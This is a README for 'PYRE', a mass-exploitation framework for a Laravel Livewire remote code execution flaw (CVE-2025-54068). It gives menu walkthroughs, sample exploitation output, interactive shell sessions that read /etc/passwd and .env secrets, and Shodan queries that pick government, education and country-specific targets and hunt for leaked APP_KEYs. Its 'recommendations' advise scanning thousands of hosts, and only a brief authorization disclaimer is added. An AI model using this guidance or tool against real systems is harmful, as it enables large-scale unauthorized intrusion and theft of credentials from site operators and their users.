# PYRE - Livewire RCE Exploit Framework

```
██████╗ ██╗   ██╗██████╗ ███████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝
██████╔╝ ╚████╔╝ ██████╔╝█████╗  
██╔═══╝   ╚██╔╝  ██╔══██╗██╔══╝  
██║        ██║   ██║  ██║███████╗
╚═╝        ╚═╝   ╚═╝  ╚═╝╚══════╝

Livewire RCE Exploit Framework
CVE-2025-54068 | Bob Marley Labs
Based on Livepyre by Synacktiv
```

## 📋 Description

**PYRE** is a comprehensive exploitation framework for Laravel Livewire Remote Code Execution vulnerability (CVE-2025-54068). This tool provides automated scanning, exploitation, and interactive shell capabilities for both authenticated (WITH APP_KEY) and unauthenticated (WITHOUT APP_KEY) attacks.

### Key Features

- ✅ **Automated Livewire Scanner** - Multi-threaded scanning with snapshot & CSRF detection
- ✅ **WITHOUT APP_KEY Exploitation** - Exploit vulnerable Livewire installations without credentials
- ✅ **WITH APP_KEY Exploitation** - Use leaked APP_KEY for higher success rates (60-80%)
- ✅ **Interactive Shells** - Full interactive shell access on compromised targets
- ✅ **Auto-Function Detection** - Automatically tries system, passthru, exec, shell_exec
- ✅ **Mass Exploitation** - Process thousands of targets from a file
- ✅ **Real-time Saving** - Results saved immediately with auto-flush
- ✅ **Clean Output** - Organized results in timestamped folders

## 🎯 CVE-2025-54068

**Vulnerability:** Laravel Livewire Insecure Deserialization RCE  
**Affected Versions:** Livewire < 3.6.4  
**CVSS Score:** 9.8 (Critical)  
**Attack Vector:** Network  
**Authentication:** None (for WITHOUT APP_KEY method)

### Vulnerable Versions
- Livewire v2.x (All versions)
- Livewire v3.0.0 - v3.6.3

### Patched Versions
- Livewire >= v3.6.4

## 📦 Installation

### Requirements
```bash
Python 3.7+
```

### Dependencies
```bash
pip install requests urllib3
```

### File Structure
```
Laravel RCE/
├── main.py              # Main exploitation framework
├── exploit/
│   └── payload.json     # RCE gadget chain payload
├── grabs.py             # Shodan mass grabber (optional)
└── list.txt             # Your target list
```

## 🚀 Usage

### Quick Start
```bash
python main.py
```

### Menu Options

```
[1] Scan targets for Livewire
    └─ Multi-threaded scanner for Livewire detection
    └─ Identifies snapshots, CSRF tokens, and versions
    └─ Output: Clean URL list (one per line)

[2] Exploit WITHOUT APP_KEY
    ├─ [1] Single target
    └─ [2] Mass targets
    └─ Auto-tries: system → passthru → exec → shell_exec

[3] Exploit WITH APP_KEY
    ├─ [1] Single target
    └─ [2] Mass targets
    └─ Requires: base64:xxxxx... APP_KEY

[4] Single Interactive Shell (No Key)
    └─ Auto-detects working PHP function
    └─ Persistent shell session

[5] Single Interactive Shell (With Key)
    └─ Auto-detects working PHP function
    └─ Persistent shell session

[0] Exit
```

## 📖 Detailed Examples

### 1. Scanning for Vulnerable Targets

**Scan a list of domains:**
```bash
python main.py
[1] Scan targets for Livewire
Target list: list.txt
Threads: 20

# Output:
[VULN] [SNAP+CSRF] http://example.com
[VULN] [SNAP+CSRF] http://target.com
[SKIP] [NO-SNAP] [CSRF] http://notgood.com

Results saved: Pyre_Results_20260601_024759/Livewire_Vulnerable.txt
```

**Output Format:**
```
http://example.com
http://target.com
http://another.com
```
One URL per line, ready for mass exploitation!

---

### 2. WITHOUT APP_KEY Exploitation

#### Single Target
```bash
python main.py
[2] Exploit WITHOUT APP_KEY
[1] Single target
Target URL: http://example.com
Command: id

# Will auto-try all functions:
[TRYING] Function: system
[TRYING] Function: passthru
[SUCCESS] Got response

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Mass Targets
```bash
python main.py
[2] Exploit WITHOUT APP_KEY
[2] Mass targets
Target list: Pyre_Results_20260601_024759/Livewire_Vulnerable.txt
Command: whoami

[1/50] http://example.com
[SUCCESS] Function: passthru | www-data

[2/50] http://target2.com
[FAILED] All functions failed

Results saved: Pyre_Results_20260601_030145/Livewire_RCE_NoKey.txt
```

---

### 3. WITH APP_KEY Exploitation

**Where to find APP_KEY:**
- Laravel error pages (Whoops!)
- `.env` file leaks
- GitHub repositories
- Backup files
- Debug pages

#### Single Target
```bash
python main.py
[3] Exploit WITH APP_KEY
[1] Single target
Target URL: http://example.com
APP_KEY: base64:tXSJQzDRRjKGMBRRvQliAb1Dr2X+ogaqSIz7R2RBls8=
Command: id

[TRYING] Function: system
[SUCCESS] RCE SUCCESSFUL WITH: system
uid=33(www-data) gid=33(www-data)
```

#### Mass Targets with APP_KEY
```bash
python main.py
[3] Exploit WITH APP_KEY
[2] Mass targets
Target list: targets.txt
APP_KEY: base64:tXSJQzDRRjKGMBRRvQliAb1Dr2X+ogaqSIz7R2RBls8=
Command: cat /etc/passwd

[1/100] http://site1.com
[SUCCESS] Function: system | root:x:0:0:root:/root:/bin/bash...

Results saved: Pyre_Results_20260601_031234/Livewire_RCE_WithKey.txt
```

---

### 4. Interactive Shell (No Key)

```bash
python main.py
[4] Single Interactive Shell (No Key)
Target URL: http://example.com

[*] Auto-detecting working function...
[TRYING] system... OK

[+] Starting interactive shell on http://example.com
[+] Using function: system

Pyre> whoami
www-data

Pyre> pwd
/var/www/html

Pyre> ls -la
total 48
drwxr-xr-x 8 www-data www-data 4096 May 31 02:00 .
drwxr-xr-x 3 root     root     4096 May 30 10:15 ..

Pyre> cat .env
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:tXSJQzDRRjKGMBRRvQliAb1Dr2X+ogaqSIz7R2RBls8=
...

Pyre> exit
```

---

### 5. Interactive Shell (With Key)

```bash
python main.py
[5] Single Interactive Shell (With Key)
Target URL: http://example.com
APP_KEY: base64:tXSJQzDRRjKGMBRRvQliAb1Dr2X+ogaqSIz7R2RBls8=

[*] Auto-detecting working function...
[TRYING] system... OK

[+] Starting interactive shell on http://example.com
[+] APP_KEY: base64:tXSJQzDRRjKGM...
[+] Using function: system

Pyre> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Pyre> uname -a
Linux server 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux

Pyre> exit
```

## 🔍 Finding Targets

### Using grabs.py (Shodan Integration)

```bash
python grabs.py
# Automatically queries Shodan for Livewire targets
```

### Manual Shodan Queries

#### Best Queries for Vulnerable Targets:

**Primary Query (Most Results):**
```
http.html:"wire:snapshot"
```

**Specific Vulnerable Versions:**
```
http.html:"wire:snapshot" http.html:"csrf-token"
http.html:"wire:snapshot" http.html:"livewire/livewire.js?id=90730a3b0e7144480b20"
http.html:"wire:snapshot" http.html:"Laravel v8"
```

**Country-Specific (Indonesia Example):**
```
http.html:"wire:snapshot" country:ID
http.html:"wire:snapshot" http.html:"laravel_session" country:ID
```

**Educational Sites (Often Outdated):**
```
http.html:"wire:snapshot" hostname:.edu
http.html:"wire:snapshot" hostname:.ac.id
```

**Government Sites:**
```
http.html:"wire:snapshot" hostname:.gov
http.html:"wire:snapshot" hostname:.go.id
```

### Finding APP_KEYs

**Shodan Queries for APP_KEY Leaks:**
```
http.html:"APP_KEY"
http.html:"APP_KEY" http.html:"base64:"
http.title:"Whoops" http.html:"APP_KEY"
http.html:"Laravel" http.html:".env"
```

## 📊 Success Rates

| Method | Success Rate | Notes |
|--------|--------------|-------|
| **WITHOUT APP_KEY** | ~0.1-2% | Only works on unpatched Livewire < 3.6.4 |
| **WITH APP_KEY** | ~60-80% | Much higher success, requires leaked APP_KEY |
| **Interactive Shell** | Same as above | Depends on initial exploitation method |

### Why WITHOUT APP_KEY Has Low Success:
- ✗ Most Livewire installations are patched (>= 3.6.4)
- ✗ Gadget chains are version-specific
- ✗ Modern PHP has type checking that breaks old exploits
- ✗ WAF/Security protections

### Recommendations:
1. **Scan 1000+ targets** to find vulnerable ones
2. **Focus on WITH APP_KEY** when you have keys
3. **Target older sites** (.edu, .gov, unmaintained sites)
4. **Use Shodan queries** to find Livewire v2.x and v3.0-v3.6.3

## 🛠️ Advanced Usage

### Custom PHP Functions

The tool auto-tries these functions:
1. `system` - Most common
2. `passthru` - Binary-safe alternative
3. `exec` - Returns last line only
4. `shell_exec` - Returns full output

### Output Files

All results are saved in timestamped folders:
```
Pyre_Results_20260601_024759/
├── Livewire_Vulnerable.txt     # Scanner results
├── Livewire_RCE_NoKey.txt      # Exploitation results (No Key)
└── Livewire_RCE_WithKey.txt    # Exploitation results (With Key)
```

### Debug Mode

First 3-5 targets in mass exploitation show verbose debug output:
```
[1/100] http://example.com
[+] CSRF: XyZ123AbC456DeF789...
[+] Update URI: livewire/update
[+] Found 2 snapshot(s)
[+] Found 3 parameter(s)
[STAGE1 OK] Snapshot casted to array
[*] Sending payload: system('id')
[DEBUG] Status: 200, Length: 1234
[SUCCESS] Got response
```

## ⚙️ Configuration

### Modify Threads (Scanner)
```python
# In main.py, when prompted:
Threads (default 10): 20  # Increase for faster scanning
```

### Modify Timeout
```python
# In main.py line ~144:
self.timeout = 10  # Change to 15 or 20 for slow servers
```

## 📝 Common Issues & Solutions

### Issue: "CSRF token not found"
**Solution:** Target doesn't have Livewire on that specific URL. Try:
- Homepage: `http://example.com/`
- Login page: `http://example.com/login`
- Dashboard: `http://example.com/dashboard`

### Issue: "HTTP 405 Method Not Allowed"
**Solution:** Server-side protection. Target is likely patched or protected.

### Issue: "Server returned snapshot (exploit failed)"
**Solution:** Gadget chain doesn't exist on this Laravel/Livewire version. Try WITH APP_KEY method.

### Issue: "All functions failed"
**Solution:** 
1. Target is patched (Livewire >= 3.6.4)
2. PHP functions are disabled (`disable_functions`)
3. WAF is blocking

### Issue: Returns "MAINTANCE" or static text
**Solution:** Server is in maintenance mode or output is being replaced. Try different targets.

## ⚖️ Legal Disclaimer

For authorized penetration testing, bug bounty programs, and educational purposes only. Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act 1990 - UK
- EU Cybersecurity Act

**USE AT YOUR OWN RISK.** Author assumes NO LIABILITY for misuse.

By using this tool, you confirm you have explicit authorization to test target systems.

---
**Buy me a Coffee:**
```
₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
```

© 2026 khadafigans
